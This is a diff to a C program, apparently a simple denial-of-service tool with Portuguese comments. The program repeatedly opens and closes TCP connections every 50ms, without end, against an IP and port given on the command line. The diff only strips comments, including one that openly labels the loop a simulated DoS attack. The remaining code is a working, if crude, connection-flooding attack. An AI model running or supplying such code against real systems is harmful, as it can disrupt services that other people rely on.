@@ -23,7 +23,7 @@ int main(int argc, char *argv[]) {
         return 1;
     }
 
-    mostrar_demo();  // Mostra a demonstração antes da execução
+    mostrar_demo();  
 
     char *ip = argv[1];
     int porta = atoi(argv[2]);
@@ -42,7 +42,7 @@ int main(int argc, char *argv[]) {
     alvo.sin_port = htons(porta);
     alvo.sin_addr.s_addr = inet_addr(ip);
 
-    while (1) {  // Loop infinito (simula ataque DoS)
+    while (1) {  
         int meusocket = socket(AF_INET, SOCK_STREAM, 0);
         if (meusocket < 0) {
             printf("❌ Erro ao criar socket!\n");
@@ -57,8 +57,8 @@ int main(int argc, char *argv[]) {
             printf("⚠️ Falha na conexão...\n");
         }
 
-        close(meusocket); // Fechar conexão após cada tentativa
-        usleep(50000);    // Pequeno delay para evitar travamentos (50ms)
+        close(meusocket); 
+        usleep(50000);    
     }
 
     return 0;
